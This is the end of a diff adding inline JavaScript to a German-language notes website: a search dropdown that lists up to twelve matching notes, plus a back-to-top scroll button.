+    var q = this.value.trim();
+    if (q.length < 1) { res.innerHTML = ''; res.classList.remove('show'); return; }
+    var matches = findNotes(q);
+    if (matches.length === 0) {
+      res.innerHTML = '<div style="padding:10px;color:var(--text-muted);font-size:12px">Keine Ergebnisse</div>';
+    } else {
+      var html = '';
+      for (var k = 0; k < Math.min(matches.length, 12); k++) {
+        var m = matches[k];
+        html += '<a href="../' + m.n.p + '" class="sr-item"><div class="sr-title">' + m.n.t + '</div><div class="sr-meta">' + m.n.f + '</div></a>';
+      }
+      res.innerHTML = html;
+    }
+    res.classList.add('show');
+  });
+  document.addEventListener('click', function(e) {
+    if (!res.contains(e.target) && e.target !== inp) res.classList.remove('show');
+  });
+  inp.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') { res.classList.remove('show'); inp.blur(); }
+  });
+})();
+(function(){
+  var btn = document.getElementById('back-to-top');
+  if (!btn) return;
+  window.addEventListener('scroll', function() {
+    btn.classList.toggle('show', window.scrollY > 400);
+  });
+  btn.addEventListener('click', function() {
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  });
+})();
+</script>
+</body>
+</html>
